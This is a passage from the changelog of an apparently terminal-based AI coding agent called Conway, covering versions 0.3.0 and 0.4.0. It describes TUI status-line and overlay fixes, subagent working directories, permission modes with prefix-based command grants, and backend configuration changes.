  directly before `mode` in the default field order, an undercounted
  `lineage` rung could make the assembly believe it had more room than it
  did, with the real overflow landing on — and mid-word-clipping — the
  `AUTO-ALLOW` indicator. Width accounting now goes through ratatui's own
  `Span::width()`/`Line::width()` display-width helpers instead of
  `.chars().count()`.

- **A status line too narrow to fit even its most degraded form was
  silently clipped mid-word.** When every field bottomed out at its own
  floor and the assembled line still didn't fit, it was handed unclamped to
  a `Paragraph` with no `.wrap()`, and ratatui truncated inside a field's
  text with no visible sign anything was cut (e.g. `AUTO-ALLOW` rendering
  as `AUTO-ALLO` at 10 columns) — contradicting the status line's own
  "never a silent clip" design. The assembled line is now clamped
  explicitly before it ever reaches the renderer: an over-length line is
  cut at a character boundary and marked with a trailing `…`, so a
  pathological width still degrades honestly instead of looking like an
  accident.

## [0.4.0] — 2026-07-29

### Added

- **A typed `Event::UserTurn` for the event stream.** A user's own prompt
  had no typed representation on the flat `Event` enum: replay fell back to
  `Event::AgentProgress { note: format!("user turn: {text}") }`, so the only
  way to recognize a prompt was matching a literal `"user turn: "` string
  prefix — fragile (a genuine notice could start with it too), and it meant
  a library consumer watching the bare `EventStream` could not tell "the
  user said this" from "the runtime noted this" the way the TUI could,
  because the TUI's transcript prompt bubble came from its own local push,
  not from the event stream at all. That was a real mode divergence: the
  TUI only *looked* correct because it kept its own copy alongside the
  facade, exactly the kind of renderer bug the interactive-first principle
  calls out.

  `Event::UserTurn { text, prov }` closes this, and is emitted **live**
  (`conway-runtime`'s `Runtime::prompt`/`start_root`, and `subagent.rs`'s
  `start` for a `Spawn` with a non-empty prompt — ordering-checked so it
  never precedes that agent's own `Event::AgentSpawned`), not only
  synthesized on replay. The TUI's `submit`/`deliver_first_message` no
  longer push `Entry::User` into the transcript locally; `AppState::apply`
  now builds it from this same event, so a prompt appears exactly once
  whether the TUI is live, replaying a focus switch, or a library embedder
  is watching the raw event stream — one path, every mode.
  `ForkDirective`/`ParentSteer` remain on the `AgentProgress` fallback for
  now, a disclosed scope decision, not an oversight.

- **`SpawnSpec::cwd` — a spawned child can now run with its own working
  directory (C1).** conway's hierarchical model spawns children to explore
  small portions of a codebase; an embedder (Kepler) scopes each child to
  one region. Previously a child's relative tool paths always resolved
  against the PARENT's cwd — `SubagentSpec` had no `cwd` field at all — so
  scoping a child to a subdirectory was possible only via prompt discipline
  plus permission gating. `conway_core::agent::SubagentSpec` gains
  `cwd: Option<PathBuf>` (`#[serde(default)]`, so an existing persisted
  spec without the key still deserializes to `None`); `conway-runtime`'s
  `SubagentHost::start` resolves it once and uses the SAME resolved value at
  both the child's `SessionMeta.cwd` and its `AgentLoop`/`ToolCtx.cwd` — the
  two must never diverge. An absolute override is used as-is; a relative one
  resolves against the PARENT's cwd at spawn time; a nonexistent resolved
  path fails the spawn fast, with a clear error, rather than starting a
  child whose tools would silently fail on every relative path. A
  grandchild spawned with `cwd: None` inherits its immediate parent's
  (possibly-overridden) cwd, not the root's. This is defense in depth, not
  a sandbox: it governs relative-path resolution only — an absolute path,
  or a `..` that walks back out, still escapes it; the permission gate
  remains the actual enforcement layer.

  Exposed on the facade as `SpawnSpec::cwd(path)` (`conway/subagent_spec.rs`)
  only — deliberately not on `ForkSpec`: a fork inherits the forker's ENTIRE
  context, so a cwd override there would be incoherent with the
  context the child actually sees. See `docs/crates/conway.md`'s
  `SpawnSpec` section for the full semantics.

### Fixed

- **The TUI's sticky scroll header showed the wrong thing.** T6's own
  problem statement was scroll-shaped — "you scroll and lose track of where
  you are" — but its binding decision put `session <id> · agent <id>[ via
  lineage] · model · ctx%` on it: application chrome answering "what
  session/agent/model am I in", not "what am I looking at". The tell was
  T6's own gating, which showed that line only while the transcript
  overflowed the viewport — nobody gates session/model/ctx on scroll
  position if they actually mean it as persistent chrome.

  The overlay now shows **only** the current turn's own prompt, and only
  while it has scrolled out of view — triggered by whether the nearest
  `Entry::User` at or before the viewport's topmost visible row is itself
  still (at least partly) on screen, never by "the transcript overflows"
  (T6's original test) or `!follow_tail` (the floating footer's own test,
  which would also wrongly fire for a short turn scrolled back only
  slightly). It no longer reserves a layout row either: T6's header used to
  claim a real `Constraint::Length` row whenever content overflowed,
  reflowing the transcript out from under the reader as that row
  appeared/disappeared; the overlay is now drawn straight onto the frame
  after the transcript, the same way the floating "jump to bottom" footer
  already was.

  `session`/`model`/`ctx%` were never removed — they always belonged in the
  persistent status line and stay there. The one field that genuinely
  needed a new home was V5's lineage breadcrumb, which T6 had misfiled onto
  the scroll overlay in the first place: it moved to two new
  `[tui.status_line]` fields, `session` and `lineage` (added to the default
  Lean line), carrying V5's width-degrade machinery and its
  fork/spawn-content trap with it unchanged. The status line's own `hint`
  field, which used to append `focused: <id>` off-root, now suppresses that
  note whenever `lineage` is part of the resolved field list, so the two
  never say the same thing twice — it survives only as a fallback for a
  pinned `fields` config from before this change, which will not
  automatically gain either new field.

- **The sticky prompt overlay re-wrapped the entire transcript, every
  entry, on every render.** `entry_row_starts` (used to find which entry
  governs the row currently at the top of the transcript viewport) built a
  fresh `Vec<Line>` + `Paragraph` and re-ran `line_count` for every
  transcript entry unconditionally, with no early exit — and it ran on
  every dirty render, which includes a 125ms animation tick throughout
  active streaming, exactly when the transcript is also growing. It now
  short-circuits at the row the caller actually asked about: entries whose
  own start row already exceeds that point are never turned into `Line`s or
  measured at all. A `state.follow_tail` skip was considered and explicitly
  rejected — the overlay legitimately shows while auto-following the tail
  of a single turn whose own response is taller than the viewport (a long
  streaming answer, the most common time this runs), so that gate would
  have silently hidden a correct overlay rather than been a safe no-op.

- **The status line could silently clip `hint` off narrow terminals.**
  Adding `session`/`lineage` to the default field order (see above) grew
  the line's full length to ~106 characters; every field but `lineage`
  rendered its full text unconditionally with no `.wrap()`, so anything
  past the render width was clipped by the terminal with no visible sign —
  at 80 columns `hint` lost roughly 26 characters versus ~18 before, and
  below ~40 columns it vanished entirely, along with the line's only
  pointer to `/help` and the `/agents` toggle. The status line now budgets
  its own width: each field degrades through a small ladder of
  shorter-but-still-complete phrasings (the same shape the floating scroll
  footer and `lineage`'s own Full → Compact → Bare degrade already used),
  giving up space in a fixed priority order (ambient chrome and telemetry
  first, then `session`/`lineage`, then `activity`, then `hint`, with
  `mode` never dropped) until the line fits or nothing more can be shrunk.
  `AUTO-ALLOW` — a genuine safety signal, not decoration — is the one
  thing on the line guaranteed to survive as long as anything does, down
  to the narrowest terminal that shows anything at all. See
  `docs/crates/conway-cli.md`'s `[tui.status_line]` section for the full
  give-up order and reasoning.

## [0.3.0] — 2026-07-28

### Added

- **Permission modes and pattern grants.** Approving every command
  individually does not scale — a real session can produce hundreds of
  prompts. Three modes now exist: `prompt` (the default, unchanged
  behavior), `plan` (non-mutating tools only), and `AUTO-ALLOW`. The mode
  is switchable from `/settings`, which is also the escape hatch out of an
  over-broad mode mid-session, and it is always visible in the status line.

  The underlying `AllowAlways` machinery already existed; the reason it
  never helped is that its cache key included a digest of the exact
  arguments, so `git status` and `git diff` were different entries and
  every distinct command re-prompted.

  Pattern grants fix that: `bash:git status` covers `git status --short`
  but not `git push`. Patterns are **prefixes matched on whole arguments,
  not regexes** — `bash:git .*` reads as tight, but `.` matches `;`, so it
  would authorize `git status; <anything>`.

  **The rule that makes prefixes safe:** a pattern applies only when the
  command contains no shell metacharacters. `git status && <anything>`
  starts with `git status`, so it always re-prompts regardless of any
  matching grant. The check runs before any prefix comparison, so nothing
  can bypass it. It is deliberately over-eager — a harmless pipe still
  re-prompts, because an unnecessary prompt costs a keystroke and a missed
  one costs arbitrary execution.

  Plan mode is defined on the tool's **declared category**, never on
  command text: `bash` declares `Execute` whatever it is handed, so
  `bash cat file` is blocked even though it only reads. Deciding otherwise
  would mean parsing shell. A category Conway does not have yet is blocked,
  not allowed.

  Grants inherit to subagents via the existing `AgentSubtree` scope. Rules
  persist to `.conway/permissions.json` (project-first, then global) as a
  human-readable list; a corrupt file **fails closed**, authorizing nothing.

  The permission prompt offers `[p]` to grant a pattern, and states what
  accepting would permit before you press it. The offered prefix is two
  tokens (`git status`, not `git`) — `git` alone would silently include
  `git push --force`. No offer is made for a command carrying shell
  metacharacters, since the gate would refuse to honor it anyway. Rules
  from the project and global files merge; new grants are written to the
  project file so they can be reviewed in a diff. Switch modes, review
  grants, and revoke them all from `/settings` (per-rule revocation is not
  implemented yet).

- **TUI: `/help` keybinding overlay (T7).** `/help` used to dump a static
  command list into the transcript as a pile of `Entry::Notice` lines,
  spamming the conversation with content that already lived in the `/`
  command palette, and there was no keybinding reference anywhere. `/help`
  now opens a read-only overlay (`tui/view/help.rs`) instead and pushes
  zero transcript entries.

  The overlay is keybindings-only: every genuine slash command stays
  exclusively in the `/` palette, so the two surfaces can never drift into
  duplicating each other (`/thinking`/`/timestamps` were the one deliberate
  exception at the time, since they functioned as keyboard-driven view
  toggles — both are since removed in favor of `/settings`, above). It
  groups every binding Conway actually has — input & editing, history &
  navigation, tools & display, the settings menu's own keys, the modal-only
  keys for the `/ask` modal / intent-confirm card / permission prompt, and
  the agent panel — plus a trailing note that mouse-wheel scrolling is
  deliberately not a Conway binding (it's your terminal's own scrollback;
  capturing the mouse would disable the terminal's native click-drag text
  selection). `Esc` closes it; no hotkey opens it, since Conway is always in
  input-typing mode.

  The overlay is not a `Mode` variant — it's a plain `AppState::help_open`
  flag, gated on `mode == Normal` at both draw and key-routing time — so it
  can never stack on top of an active permission prompt, `/ask` modal, or
  intent-confirm card (each of those is a decision the user owes an
  answer), and reappears on its own once one resolves. New theme slots:
  `help_border` (blue, bold) and `help_key` (green, bold).

- **TUI: input ergonomics — multi-line, persisted history, bracketed
  paste, and a cursor-clamp fix (T8).** The input line was
  single-line-only (`Enter` always submitted, `\n` could never land in
  it), had no memory of previous prompts, mangled a pasted block into a
  flood of individual keystrokes, and clamped a long line's cursor to the
  box's own width instead of scrolling — the cursor froze at the right
  edge while the text kept extending off-screen invisibly.

  `Alt-Enter` **and** `Shift-Enter` both insert a literal `\n` (some
  terminals encode Shift-Enter indistinguishably from a plain Enter, so
  only binding one would silently lose multi-line entry there); plain
  `Enter` still submits. The box's own height grows with the draft
  (capped at a third of the terminal height) without disturbing T6's
  header-overflow math, which now reads the same grown height.

  `Up`/`Down` recall a bounded, persisted history FIFO
  (`[tui.history_size]`, default 500) — oldest evicted once the cap is
  exceeded, `Down` past the newest entry restores whatever unsent draft
  you had going, and a recalled entry is editable inline before
  resubmit. History is contended with the `/` command palette, the
  `/agents` panel, and a multi-line draft's own interior lines, resolved
  in that fixed priority order so recall can never fire while another
  surface owns the arrow keys. It persists to `~/.conway/history`
  (alongside the global config, not the project checkout), one
  JSON-string-encoded entry per line so an embedded `\n` round-trips,
  written via a tmp-then-rename so a crash mid-write can't corrupt it. A
  missing/corrupt file degrades to an empty history and a failed
  write never fails the submit that triggered it.

  Bracketed paste is now actually enabled on the terminal (it previously
  wasn't, so `Event::Paste` never even arrived) and inserts the whole
  pasted block as one edit at the cursor, not a per-character flood.

  The cursor-clamp bug is fixed: the box's cursor line now scrolls
  horizontally (and, for a tall multi-line draft, the box scrolls
  vertically) so the cursor is always genuinely at the character it
  claims to be at, instead of visually pinned to `width - 2` regardless
  of the draft's true length.

- **TUI: sticky context header, End/Home jump keys, and a scrolled-back
  indicator (T6).** Scrolling back through a long conversation gave no
  sense of position and no way home but paging. Three keyboard-only
  affordances now cover it.

  A **sticky header** (`session · agent · model · ctx%`) sits above the
  transcript, but only while the transcript actually overflows — content
  that fits on screen never gives up a row. `agent` shows only off-root
  and `model` only once routing has happened, so the single-agent case
  stays uncluttered. The `ctx%` figure reuses `status::ctx_label` rather
  than recomputing the percentage, so header and status line cannot
  disagree.

  **End** snaps to the tail and re-engages auto-follow; **Home** jumps to
  the top and disengages it. Both apply only when the input box is empty
  — with text present they keep their ordinary cursor-movement meaning,
  so the jump never steals a key mid-edit.

  A **floating footer** (`↓ N lines above tail — End to jump to bottom`)
  overlays the transcript's bottom row while scrolled up, with a live
  count, and disappears when auto-follow re-engages. On a narrow terminal
  it degrades to a shorter complete form rather than clipping mid-word,
  since a truncation would cut the `End` hint off first.

  Neither widget joins the transcript's `Paragraph` (the header gets its
  own `Rect`; the footer is a `Clear` overlay), so the clean-copy
  guarantee is unchanged. New theme slots `header` and `scroll_footer`.

  Mouse-wheel scrolling remains deliberately unimplemented: capturing the
  wheel would disable the terminal's native click-drag text selection,
  which clean-copy exists to protect. Native terminal scrollback is
  unaffected — it scrolls the emulator's buffer, not Conway's, which is
  why it cannot drive the indicator.

- **Kimi coding-plan support, and Anthropic-compatible endpoints
  generally.** Kimi's coding plan is served over an Anthropic-shaped
  `/v1/messages`, so it needs no dedicated adapter — point `base_url` at
  `https://api.kimi.com/coding/` with `kind = "anthropic"`. Endpoints
  under a path prefix now have that prefix preserved (`.../coding/` →
  `.../coding/v1/messages`), pinned by a test so a future refactor cannot
  silently drop it.

  `AnthropicConfig` gained an optional `id`, defaulting to `"anthropic"`
  so existing configs are unaffected. Previously `AnthropicBackend::id()`
  was hardcoded, which forced any Anthropic-kind backend to occupy the
  config key `"anthropic"` — you could not name a backend `kimi`, and you
  could not configure Kimi and Anthropic at the same time. Both now work;
  the build-time key check that enforced the old constraint is removed.

  Bundled model metadata gains `k3-256k` (262,144 tokens) and `k3[1m]`
  (1,048,576 tokens), so the status line's `ctx%` is accurate rather than
  falling back to raw counts. The literal brackets in `k3[1m]` are part of
  the provider's model id; a test pins that they survive TOML parsing.

  See `docs/crates/conway-backends.md` for a copy-pasteable config, which
  is itself pinned by a test that loads it through the real config loader.

- **TUI: tool output folding + expand (T5).** A settled tool entry's
  preview in the transcript now renders **folded** by default: the first
  `[tui.tool_preview_lines]` physical lines (default 3) plus a dim
  `… (+M lines, Ctrl-E to expand)` affordance naming how many lines are
  hidden, instead of spilling the entire preview inline with no bound.
  `Ctrl-E` flips `expanded` on **every** tool entry at once (MVP — no
  transcript-cursor/selection state, so expand/collapse is all-at-once);
  an expanded entry renders its full preview. The stored `preview` is
  never truncated — the cap is render-time only, so toggling never loses
  data. The toggle is pure state mutation: `Ctrl-E` does NOT touch
  `scroll` or `follow_tail`; the next render's existing clamp
  (`state.scroll.min(max_scroll)`) re-clamps to the nearest valid
  position without snapping the viewport. `Ctrl-E` is a control key
  (not a bare `e`, which stays ordinary text input for the always-on
  input box), bound directly to
  `AppState::toggle_all_tool_entries_expanded` (mirroring the `v`
  visibility-filter key's direct-mutation pattern — no `Action` variant,
  no facade side effect). Settled tool output honors the clean-copy
  invariant: no box-drawing, no `Block` — the entry ends with a blank
  line + a dim plain `-` rule as a non-box separator. New config key
  `[tui.tool_preview_lines]` (optional integer, default 3, clamped to
  `1..=200` with a fallback to 3 on bad input, never a panic);
  `CONWAY_TUI__TOOL_PREVIEW_LINES=10` overrides via env. The
  `Entry::Tool::expanded` flag and the `tool_lines` collapsed/expanded
  render branch are generic for T4's tool-args reuse. The status-line
  `hint` field now advertises `Enter submit · Ctrl-E expand` (reconciling
  the earlier `Ctrl-E submit` hint — Enter was always the actual submit
  key; T8 will move submit to Alt/Shift-Enter). See
  `docs/crates/conway-cli.md`'s "Tool output folding + expand (T5)"
  section.

- **TUI: transcript provenance — speaker markers, reasoning variant,
  timestamps, tool args/progress (T4).** The transcript now surfaces
  per-entry provenance: reasoning traces (`Event::ThinkingDelta` ->
  `Entry::Reasoning`, dim+italic with a `thinking> ` prefix, **expanded
  by default**; `/thinking` toggles `show_reasoning` and hides them
  entirely while off, but entries are still stored so toggling back on
  restores them without replay); assistant speaker markers
  (`Entry::Assistant` carries the serving model name, rendered as a
  `[modelname]> ` prefix in `theme.assistant_marker`; omitted on replay
  where no model provenance is available); tool args + progress
  (`Entry::Tool` stores `Event::ToolCallProposed::args` as a compact
  JSON string, rendered as a one-line truncated `args: …` preview while
  collapsed and pretty-printed while expanded — both args and output
  expand/collapse together via T5's `Ctrl-E` toggle; accumulated
  `Event::ToolProgress { call_id, note }` notes — previously dropped —
  append to the matching in-flight tool entry by `call_id` and render as
  dim `-> {note}` lines); per-entry timestamps (`/timestamps` toggles
  `show_timestamps`, default off, prepending an `HH:MM ` prefix styled
  with `theme.timestamp` to each entry's first rendered line); and a
  turn-end summary (`Event::TurnFinished` stamps `{elapsed} · {tokens}
  ({n%} cached)` — e.g. `1m 6s · 1.4k tok (88% cached)` — onto the last
  assistant/reasoning block, rendered as a final dim line). The
  streaming cursor (T2) extends to the live reasoning line while
  `activity == Thinking`. New theme slots `assistant_marker`,
  `reasoning`, and `timestamp` (defaults: magenta+bold, dark_gray+italic,
  dark_gray) are configurable via `[tui.theme]`. `/thinking` and
  `/timestamps` are intercepted in `app.rs::submit` (state-only toggles,
  never sent to the model), listed in `/help`, the command palette, and
  the status-line hint. Settled `entry_lines` output honors the
  clean-copy invariant (no box-drawing glyphs). See
  `docs/crates/conway-cli.md`'s "Transcript provenance (T4)" section.

- **Facade lifecycle ops for ephemeral `/ask` children** —
  `Conway::promote` (the one-way ephemeral→persistent flip: durable header
  rewrite, live-tree flip, and an `Event::AgentPromoted` for UIs, in that
  failure-ordered sequence), `Conway::pull_in` (merge the child's question
  and answer into the parent's log — the question re-stamped
  `Provenance::MergedAsk`, assistant records verbatim — then purge the
  child), `Conway::purge` (discard a terminal ephemeral child), and
  `Conway::sweep_stale_modal_asks` (crash-residue reaper). Ephemeral `/ask`
  children now attach as proper fork children of the asker, so they appear
  in `/agents` marked `(ephemeral)` while running.

- **`conway_ask` model-facing tool**: runs a prompt in an ephemeral fork of
  the calling agent and returns the child's full reply text (not a truncated
  summary), so the model can compose it into a `conway_subagent` spawn and
  keep curation/context-drafting inference out of the orchestrator's context
  window. Fork-only (`prompt` + optional `budget`); the child is marked
  ephemeral (shown in the TUI `/agents` panel with an `(ephemeral)` marker
  while running, and under the `v`-cycled all/finished views once done;
  excluded from default session listings; still attached to the live agent
  tree for provenance). Composes
  `conway_subagent` per the "exactly two subagent primitives" principle —
  `ask` is fork+await-text, not a third primitive.

- **`conway_ask` gains an optional `tools` arg**: narrows the ephemeral fork
  child's tool set to the named tools (`ToolSelector::Only`, the same
  selector `conway_subagent`'s `tools` arg produces) — e.g.
  `{"prompt": "summarize the diff", "tools": ["read"]}` restricts the child
  to read-only inspection. Narrowing-only: it can restrict, never widen, the
  tool set the child would otherwise inherit.

- **NL intent on `/fork` and `/spawn` with a mandatory confirmation card.**
  Free text after `/fork` or `/spawn` that does NOT start with explicit
  `@<agent_def>` syntax is classified by the facade's `intent` role
  (`Conway::classify_agent_intent`, C1) BEFORE any agent is created, and
  the classified result is shown in a confirmation card
  (`[enter]` confirm / `[e]` edit / `[esc]` manual) so inference can never
  silently choose. `[enter]` runs the classified recipe as-is
  (possibly cross-classified); `[e]` drops the classified prompt into the
  input line for editing; `[esc]` falls back to today's pre-classification
  manual flow with the raw text untouched. The verbatim passthrough
  (unconfigured `roles.intent` role, unparseable reply, invalid recipe,
  empty prompt) still shows the card with the raw text; a hard
  `ConwayError::IntentClassification` does NOT show the card and falls back
  to the manual flow with a notice. Explicit `@<agent_def>` syntax and bare
  invocations are unchanged. Oneshot (`-p`) `/fork`/`/spawn` paths are
  unchanged (deferred).

### Changed

- **TUI: palette audit — what each color means, and a few defaults tighten
  up (V7).** The request was "a little more visual polish," which usually
  means "more color" — the audit went the other way and found the palette
  was already mostly restrained; the real gaps were a couple of colors
  spent on things that don't carry meaning, and one real safety signal that
  had none.

  **Defaults change appearance** for three reasons, each narrow:

  - `timestamp`, `reasoning`, and `agent_cancelled` move off a fixed
    `Color::DarkGray` to a relative `Modifier::DIM`. `DarkGray` is an
    absolute dark color, and a dark-background terminal's own "bright
    black" frequently renders it nearly indistinguishable from the
    background; `DIM` asks the terminal to dim its *own* foreground
    instead, which stays legible on both a dark and a light scheme.
  - `help_key` (the `/help` overlay's key/chord column) drops its green —
    green already means "success" (`tool_done`/`agent_finished`) elsewhere
    in the palette, and reusing it for a plain column split blurred that
    meaning for no reason. It stays bold.
  - The status line's `AUTO-ALLOW` indicator — every tool call
    auto-approved with no prompt, a genuine safety-relevant state — now
    renders with `theme.fatal_error` (red + bold) instead of the plain
    `theme.emphasized` (bold, no color) it shared with the much lower-risk
    `plan` mode. `plan` keeps the unstyled-but-bold treatment; it only ever
    restricts what runs.

  If you had pinned any of these via `[tui.theme.timestamp]`,
  `[tui.theme.reasoning]`, `[tui.theme.agent_cancelled]`, or
  `[tui.theme.help_key]`, your override still applies unchanged — only the
  built-in defaults moved.

  **Removed:** the `agent_marker` theme slot (and its `[tui.theme.
  agent_marker]` config key) never had a call site anywhere in `view/*.rs`
  — a key a user could set that would silently do nothing, the same
  failure V6 already ruled out for `spinner_b`/`spinner_c`. It is now an
  unrecognized key rather than a no-op; if you had it set, remove it. No
  functional behavior changes either way, since it never rendered anything.

  **Considered and not done:** collapsing the `tool_*`/`agent_*` status-tag
  families (five duplicated color pairs) into one semantic set. The
  duplication is real but not a rendered-UI problem — the two families
  never draw side by side — and collapsing would have meant either breaking
  configs that already set one of the ten names or a real aliasing
  precedence risk, for a problem that is presently invisible on screen. See
  `docs/crates/conway-cli.md`'s new "Palette rationale (V7)" section for
  the full reasoning, the color-meaning rules, and what a future slot
  addition should follow.

- **TUI: `/thinking` and `/timestamps` are replaced by a single `/settings`
  menu (V4).** Two standalone slash commands, each owning exactly one
  boolean, don't scale — every future display preference would mean another
  command competing for footer/palette space. Both are now REMOVED (not
  aliased): `/settings` opens a menu, built on V1's shared modal/tree
  primitives (`tui/view/menu.rs`, its first real caller), covering "show
  reasoning traces", "show timestamps", and a THIRD setting new to runtime
  entirely — `tool_preview_lines` (T5's tool-output fold cap, previously
  config-only). The one non-boolean setting is a `Left`/`Right` stepper
  (±1, floor/cap at `1..=200`) rather than a cycled preset list — there's no
  natural "meaningfully different" preset set for a fold-cap the way a
  theme picker would have.

  Settings are **session-only**, exactly as the two commands they replace
  already were: Conway's config load is a five-source layered read with no
  writer anywhere outside test fixtures, and inventing one raises "which
  layer gets written" with no good default answer — out of this item's
  scope. A footer note says so on every render; the one setting with a real
  backing config key (`[tui.tool_preview_lines]`) names it inline, and the
  two that have no config-key equivalent today carry no such claim.

  `/settings` is gated exactly like `/help` — a plain `AppState::
  settings_open` flag, never a `Mode` variant, so it can't stack on an
  active permission prompt / `/ask` modal / intent-confirm card — and, new
  for this item, `/settings` and `/help` are also mutually exclusive with
  EACH OTHER (opening one closes the other), since both are informational
  overlays gated the identical way.

- **The status line no longer pulses, and the footer no longer lists slash
  commands.** The spinner's braille frames still advance — motion is the
  liveness cue — but the color is now steady. Cycling it on every 125ms
  tick read as strobing in the corner of the eye rather than as a signal,
  and competed with the frame animation already doing that job.

  The `spinner_b` and `spinner_c` theme slots are removed along with their
  `[tui.theme]` config keys. A config key that silently does nothing is
  worse than no key at all. If you had set either, the spinner now uses
  `spinner` alone.

  The footer read `Enter submit · Ctrl-E expand · Ctrl-P/N history ·
  PgUp/PgDn · /help · /thinking · /timestamps · /agents…`. It now names
  keys rather than commands: `Enter submit · Ctrl-E expand · /help ·
  /agents…`. Nothing became undiscoverable — `/help` is the keybinding
  overlay, which is where the rest already lives.

- **Config no longer inspects the shape of an API key.** The
  `sk-ant-oat*` prefix rejection is removed from all three layers that
  enforced it (`AnthropicConfig::validate`, `config::merge::validate`, and
  `ConwayBuilder`'s `api_key_env` resolution), along with the
  `ConfigError::SubscriptionTokenRejected` variant. Any non-empty key is
  now passed through to the configured `base_url` as-is.

  Policing which credentials look legitimate is an opinion that does not
  belong in the core, and it blocked a real use case: an
  Anthropic-compatible third-party endpoint (a coding-plan subscription, a
  self-hosted shim) could not be configured, and the resulting error
  misdirected the user to `console.anthropic.com` — the wrong vendor
  entirely. Whether a key works is the provider's answer to give, and its
  auth error is more accurate than any prefix match Conway could perform.

  **Unchanged:** an empty or whitespace-only `api_key` is still rejected
  (`ConfigError::MissingApiKey`), and an `api_key_env` naming an unset
  variable is still a hard error that names the variable. Those describe a
  missing credential, which Conway can identify precisely, rather than
  judging one it has.

- **TUI: status line rework — model + ctx% + cwd + git + field config
  (T3).** The bottom status line is now an ordered, configurable set of
  fields driven by a new `[tui.status_line]` `settings.json` section
  (schema: `conway::config::schema::StatusLineConfig`). The default Lean
  line is `mode | model | ctx | tokens | activity | hint`; `git` and
  `cwd` are also available as orderable fields. Each field renders only
  when listed in the configured `fields` order AND has data to show
  (`model` is omitted before the first turn routes; `git` is omitted
  outside a repo; etc.). Unknown field names are dropped at render time
  — never a panic. New fields: `model` (the focused agent's
  serving model display name from `Event::ModelDecision`); `ctx`
  (context-window occupancy — `ctx 42%` when the focused model's max
  context is known from `models.metadata_path`, else the raw
  cumulative `Event::ContextSegmentAdded` token estimate, compact-
  suffixed as `ctx 12.3k`; capped at `ctx 100%`); `tokens` formalizes
  the cumulative spend slot as `<total> tok (<n%> cached)`, where
  `total` is every `Usage` field summed and `n%` is the cache hit rate
  `cache_read / (input + cache_read + cache_write)` (the parenthetical
  is omitted when the denominator is 0 — divide-by-zero guarded); `git`
  (the current `git rev-parse --abbrev-ref HEAD` branch, read once at
  startup, best-effort, no polling, no new deps); `cwd` (from `--cwd` or
  `config.cwd`). The `activity` field IS T2's working indicator
  (spinner + pulse + elapsed + `+{n} tok`), unchanged; the `hint` field
  is a persistent keybinding/affordance hint (`Ctrl-E submit · ↑↓
  history · PgUp/PgDn · /help · /agents to {view|hide}`, plus
  `focused: <id>` off-root). `AppState::apply`'s previously-dropped
  `ModelDecision` arm now captures the focused model + max context;
  `ContextSegmentAdded` now also accumulates a session-wide cumulative
  context-token estimate (distinct from T2's per-turn
  `turn_running_tokens`). See `docs/crates/conway-cli.md`'s
  `[tui.status_line]` section for the full field table, the
  `tokens (n% cached)` format, and reordering/hiding instructions.

- **TUI: activity spinner + animation tick (T2).** The status line's
  "is it working?" slot now renders a braille spinner glyph plus the
  activity word plus live elapsed seconds plus the new context tokens
  added this turn (`⠋ thinking… 12s · +45 tok`) while the focused agent
  is working. The spinner glyph and the activity word pulse together
  through a small theme palette (`spinner`/`spinner_b`/`spinner_c`,
  defaulting to yellow/light_yellow/white) on a new 125ms (8 TPS)
  animation tick, additive to the existing 16ms redraw cap. The tick is
  gated by `should_animate(activity)` so an idle terminal never pays for
  animation — the counters don't advance and no redraw is forced while
  idle. The elapsed clock starts at `Event::TurnStarted`; the `+{n} tok`
  figure accumulates from `Event::ContextSegmentAdded` deltas —
  session-deduped new-segment tokens added this turn (NOT total context
  occupancy: the runtime emits `ContextSegmentAdded` only for segments
  new to a never-reset `seen_segments` set, so the figure is large on
  turn 1 then small on turn 2+ for the same conversation). The leading
  `+` signals "added this turn" and distinguishes it from the
  cumulative `| {tokens} tok |` slot; the authoritative turn-end token
  total lands via the turn-end summary (T4). New theme slots
  `spinner_b` and `spinner_c` join the existing `spinner` slot to form
  the pulse palette. While `activity == Responding`, the live,
  in-progress assistant line in the transcript also gets a block `▌`
  streaming cursor appended at render time only — never baked into the
  stored `Entry::Assistant` text or into `entry_lines` output for
  settled entries (clean-copy invariant relaxed only for the
  actively-streaming line). See `docs/crates/conway-cli.md`'s "Activity
  spinner + animation tick" section for the full mechanism.

- **TUI: central theme module + named styles (T1).** The TUI's render
  pass now reads colors/styles from a single `Theme` struct threaded
  through `view::draw` and each per-view `draw` fn as `&Theme`, replacing
  the per-call-site `Style::default().fg(Color::…)` the five view files
  used to hand-roll inline. The theme is configurable from the start via
  a new `[tui.theme]` `settings.json` section (per-named-style `fg`/`bg`/
  `modifiers` overrides; defaults match the pre-T1 exact
  `(Color, Modifier)` pairs, so an unconfigured TUI renders identically).
  Malformed overrides fall back to the affected slot's default — never a
  panic. New accent styles `assistant_marker`, `reasoning`,
  `agent_marker`, `fatal_error`, `status_dim`, and `spinner` are defined
  for later v0.3.0 polish items to consume. See
  `docs/crates/conway-cli.md`'s `[tui.theme]` section for the full named-
  style table and accepted color/modifier spellings.

- **`/ask` is now a single-turn modal with three forced fates.** Asking
  forks an ephemeral child (visible in `/agents` marked `(ephemeral)`),
  runs one turn, and opens a modal over the child's answer. Closing the
  modal forces exactly one choice: `[f]` fork (promote the child to a
  persistent session), `[p]` pull in (merge the question and answer into
  the parent's own transcript, then purge the child), or `[esc]` discard
  (purge outright). Quitting with the modal open discards. A failed fate
  keeps the modal open with the error shown. The 0.2.0 rendering — a
  dimmed aside inline in the transcript — is gone. On startup the TUI
  sweeps modal-`/ask` residue left behind by a crashed process; a new
  `ask_origin` tag on the session header distinguishes these from
  `conway_ask` tool children, which are never swept.

- **TUI `/agents` panel is now the single agent surface.** Every row shows
  the agent's recipe label — `fork @seq N` for forks (with the inherited
  fork point), `@<agent_def>` for spawns with a named agent definition,
  `(inherit)` for spawns that inherited the parent's role/model — and
  ephemeral `/ask` forks are now visible in the tree with an `(ephemeral)`
  marker instead of being omitted. While the panel is open, `v` cycles row
  visibility (active-only by default, all, finished-only) as a draw-time
  filter that never mutates the tree. `/tree` is demoted to a hidden
  alias: it still parses and renders, but its output is derived from the
  same panel tree — the same nodes and recipe labels, shown unfiltered as
  plain-text transcript lines — and it no longer appears in `/help` or the
  command palette.

### Fixed

- **`Esc` no longer discards the agent you just focused.** Forking, opening
  `/agents`, focusing the new child, then pressing `Esc` to dismiss the
  panel bounced you straight back to the root — so "focus a child and get
  the panel out of the way" was not expressible at all.

  Two changes had independently bound `Esc` (one to close the panel, one to
  return to the root) and both fired on a single press. Only the
  panel-close half was ever documented in `/help`, which is what made this
  a bug rather than a shortcut.

  `Esc` now does one thing per press, innermost surface first: it closes
  the panel if open and keeps your focus; a second press returns to the
  root. With the panel already closed it returns to the root immediately,
  so no keypress is wasted.

- **The `/agents` panel no longer appears to randomly lose agents, and
  focusing a subagent now shows where it sits in the tree.** Two dogfooding
